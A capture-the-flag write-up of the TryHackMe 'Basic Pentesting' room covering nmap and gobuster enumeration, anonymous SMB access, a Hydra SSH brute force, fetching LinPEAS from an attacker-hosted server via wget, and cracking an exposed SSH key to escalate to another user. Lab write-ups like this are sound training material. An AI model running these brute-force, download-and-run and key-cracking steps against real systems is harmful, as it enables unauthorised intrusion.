# Basic Pentesting Writeup (TryHackMe)

## Challenge Overview

This challenge simulates a real-world penetration test scenario where the attacker must gain access to a machine through open services, enumerate for sensitive data, and escalate privileges to capture the final flag. It involves techniques like directory fuzzing, SMB enumeration, password brute-forcing, and leveraging exposed SSH keys for privilege escalation.

---

## Enumeration

Started the challenge by running an Nmap scan to enumerate open ports and identify services:

```bash
sudo nmap <target-ip> -sS -T4 -A -oN init_scan
```

![2025-05-06_14-00](https://github.com/user-attachments/assets/9e66d88d-4275-4d90-a383-ad2a8a8c3191)

Discovered a website running on port 80.

## Web Enumeration

Used `gobuster` to find hidden directories:

```bash
gobuster dir -u http://<target-ip> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -q
```

![2025-05-06_14-05](https://github.com/user-attachments/assets/03db77ae-d3b5-4de7-884d-22fe38dfa4e0)

Found the `/development` subdirectory. It contained two `.txt` files that mentioned the development of the website and referenced an SMB share.

![2025-05-06_14-05_1](https://github.com/user-attachments/assets/4a94e1bf-8b4f-49a5-aaf4-79fa1d949960)
![2025-05-06_14-06](https://github.com/user-attachments/assets/42d7e777-72b6-4c88-9318-8bb7b172898a)
![2025-05-06_14-07](https://github.com/user-attachments/assets/bde4d3ef-52b8-45eb-a89f-c80324b11d7c)

## SMB Enumeration

Accessed the SMB share using `smbclient` with anonymous login:

```bash
smbclient -L //<target-ip>
smbclient //<target-ip>/Anonymous 
```

Retrieved a `.txt` file mentioning two users: `jan` and `kay`.

![2025-05-06_14-37](https://github.com/user-attachments/assets/06cb2416-a754-4bd0-89a1-05e7115aced2)

## SSH Brute Force

Used Hydra to brute-force SSH credentials for `jan`:

```bash
hydra -l jan -P /usr/share/wordlists/rockyou.txt <target-ip> ssh
```

![2025-05-06_14-45](https://github.com/user-attachments/assets/f3c9f9f3-ccf8-4e0f-b9e1-5d5fbf368439)

Cracked password: `armando`

## Privilege Escalation (to kay)

After logging in as `jan`, manual enumeration began. Encountered several dead-ends:

* `sudo -l` ‚Äì no permissions
* Checked SUID binaries ‚Äì no immediate vector
* `wget` didn't work initially

Found that `/tmp` was writable. Hosted LinPEAS on attacker machine via Python server:

```bash
python3 -m http.server 8000
```

Then on target:

```bash
cd /tmp
wget http://<attacker-ip>:8000/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

## üóùSSH Key Exploit

LinPEAS revealed an exposed private key in `/home/kay/.ssh/id_rsa`. Copied it and cracked it:

![2025-05-06_15-57_1](https://github.com/user-attachments/assets/b43735a1-b605-45c0-aed9-acc913958d16)

Extracted hash with `ssh2john`:

```bash
ssh2john id_rsa
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
```

![2025-05-06_15-57](https://github.com/user-attachments/assets/2f4ef426-9cb5-4277-ac58-e2ef0da54756)

Password: `beeswax`

Used the private key to SSH into kay's account:

```bash
ssh -i id_rsa kay@<target-ip>
```

Accessed `pass.bak`:

```bash
cat pass.bak
```

![2025-05-06_15-58](https://github.com/user-attachments/assets/dda629b3-c579-4f68-827d-854b0826680e)

‚úÖ Final flag retrieved.

---

## üßæ Conclusion

![2025-05-06_15-59](https://github.com/user-attachments/assets/dec757bf-bea6-431b-aebb-d989648cd122)

This room tested core skills in enumeration, brute-forcing, and privilege escalation:

* Gobuster revealed a hidden dev directory
* SMB share exposed usernames
* SSH brute-force using Hydra
* Privilege escalation via exposed SSH key

The challenge emphasized how poor access control, default credentials, and leftover dev artifacts can lead to full system compromise.
